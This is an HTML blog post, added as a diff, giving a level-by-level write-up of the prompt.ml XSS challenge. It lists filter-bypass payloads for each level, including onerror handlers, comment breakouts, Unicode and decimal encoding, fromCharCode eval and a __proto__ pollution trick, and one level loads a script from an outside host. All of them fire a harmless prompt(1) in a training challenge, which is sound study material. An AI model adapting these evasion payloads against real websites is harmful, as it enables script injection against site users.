@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Prompt.ml XSS challenge write up - AJDIN</title><link rel="icon" type="image/png" href=/favicon.ico /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="Prompt.ml XSS challenge write up" />
+<meta property="og:description" content="Prompt.ml is is a XSS injection site inspired by alert(1) to win.
+0x0 Just a simple XSS payload, close the last html element and get prompt(1)" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ajdin.io/posts/prompt-ml/" />
+<meta property="article:published_time" content="2020-09-28T17:06:16+02:00" />
+<meta property="article:modified_time" content="2020-09-28T17:06:16+02:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Prompt.ml XSS challenge write up"/>
+<meta name="twitter:description" content="Prompt.ml is is a XSS injection site inspired by alert(1) to win.
+0x0 Just a simple XSS payload, close the last html element and get prompt(1)"/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
+
+	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/main.css" /><link rel="stylesheet" type="text/css" href="https://ajdin.io/css/dark.css"  />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<script src="https://ajdin.io/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper post">
+		<div class="header">
+	<base href="https://ajdin.io/">
+	<h1 class="site-title"><a href="https://ajdin.io/">AJDIN</a></h1>
+	<div class="site-description"><h2>welcome to ajdin.io</h2><nav class="nav social">
+			<ul class="flat"><a href="https://github.com/ajdintrejic" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/ajdintrejic" title="Twitter"><i data-feather="twitter"></i></a><a href="mailto:ajdintrejic@protonmail.ch" title="Mail"><i data-feather="mail"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">Archive</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post-header">
+			<h1 class="title">Prompt.ml XSS challenge write up</h1>
+			<div class="meta">Posted at &mdash; Sep 28, 2020</div>
+		</div>
+
+		
+		<div class="toc">              
+			<h3>Table of Contents</h3>
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0x0">0x0</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0x1">0x1</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0x2">0x2</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0x3">0x3</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0x4">0x4</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0x5">0x5</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0x6">0x6</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0x7">0x7</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0x8">0x8</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0x9">0x9</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0xa">0xA</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0xb">0xB</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0xc">0xC</a></li>
+    <li><a href="https://ajdin.io/posts/prompt-ml/#0xd">0xD</a></li>
+  </ul>
+</nav>
+			<hr>
+		</div>              
+		
+		</aside>              
+
+		<div class="markdown">
+              		
+<p><a href="https://prompt.ml">Prompt.ml</a> is is a XSS injection site inspired by alert(1) to win.</p>
+<h2 id="0x0">0x0<a class="anchor" href="#0x0">#</a></h2>
+<p>Just a simple XSS payload, close the last html element and get prompt(1)</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&#34;&gt;&lt;img src=x onerror=&#34;prompt(1)
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x1">0x1<a class="anchor" href="#0x1">#</a></h2>
+<p>We don&rsquo;t have to close the tag</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;img src=x onerror=&#34;prompt(1)&#34;
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x2">0x2<a class="anchor" href="#0x2">#</a></h2>
+<p>call the eval function to hex encode ( and ) into \x28 and \x29</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script&gt;eval.call`${&#39;prompt\x281\x29&#39;}`&lt;/script&gt;
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x3">0x3<a class="anchor" href="#0x3">#</a></h2>
+<p>call the eval function to hex encode ( and ) into \x28 and \x29</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">--!&gt; &lt;script&gt;prompt(1);&lt;/script&gt;&lt;!--
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x4">0x4<a class="anchor" href="#0x4">#</a></h2>
+<p>This level requires to host a .js file which can execute prompt</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://prompt.ml%2f@ajdin.io/prompt.js
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x5">0x5<a class="anchor" href="#0x5">#</a></h2>
+<p>We can&rsquo;t input onerror= but we can split it into a new line and get our xss payload.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&#34;type=image src=x onerror
+=&#34;prompt(1)&#34;
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x6">0x6<a class="anchor" href="#0x6">#</a></h2>
+<p>We can see from the comment that javascript: should be disable but if we add the action to the json key we can bypass this <code>if (!/script:|data:/i.test(document.forms[0].action))</code></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">javascript:prompt(1)#{&#34;action&#34;:1}
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x7">0x7<a class="anchor" href="#0x7">#</a></h2>
+<p>If the XSS payload is across multiple inputs we can bypass the input limitation and get prompt(1) to execute</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&#34;&gt;&lt;svg/a=#&#34;onload=&#39;/*#*/prompt(1)&#39;
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x8">0x8<a class="anchor" href="#0x8">#</a></h2>
+<p>I coudn&rsquo;t get this one to work but the solution is in the Line Separator unicode sybol which breaks out of the comment</p>
+<h2 id="0x9">0x9<a class="anchor" href="#0x9">#</a></h2>
+<p>Replacing the first I with a &ldquo;wierd&rdquo; unicode char gets us to bypass that filter. For bypassing .toUpperCase() we have to use decimal encoding.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;ımg src=x onerror=&amp;#0000112&amp;#0000114&amp;#0000111&amp;#0000109&amp;#0000112&amp;#0000116&amp;#0000040&amp;#0000049&amp;#0000041&gt;
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0xa">0xA<a class="anchor" href="#0xa">#</a></h2>
+<p>We can escape the first regex by adding a sigle quote to the function prompt. It gets removed after running the second regex and we are left with prompt.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p&#39;rompt(1)
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0xb">0xB<a class="anchor" href="#0xb">#</a></h2>
+<p><code>&quot;a&quot;in(prompt(1))</code> and <code>(prompt(1))in&quot;a&quot;</code> both execute the prompt(1) function because of the in operator.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&#34;(prompt(1))in&#34;
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0xc">0xC<a class="anchor" href="#0xc">#</a></h2>
+<p>We can just create a string &ldquo;prompt(1)&rdquo; and use eval() to execute it.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">eval(String.fromCharCode(112).concat(String.fromCharCode(114)).concat(String.fromCharCode(111)).concat(String.fromCharCode(109)).concat(String.fromCharCode(112)).concat(String.fromCharCode(116)).concat(String.fromCharCode(40)).concat(String.fromCharCode(49)).concat(String.fromCharCode(41)))
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0xd">0xD<a class="anchor" href="#0xd">#</a></h2>
+<p>Explanation <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-11">here</a>.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{&#34;source&#34;:&#34; &#34;,&#34;__proto__&#34;:{&#34;source&#34;:&#34;$`onerror=prompt(1)&gt;&#34;}}
+</code></pre></td></tr></table>
+</div>
+</div>
+
+		</div>
+
+		<div class="post-tags">
+			
+				
+			
+		</div>
+		</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div> © All rights reserved |  <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
+	</nav>
+</div>
+
+
+
+<script>feather.replace()</script>
+</body>
+</html>
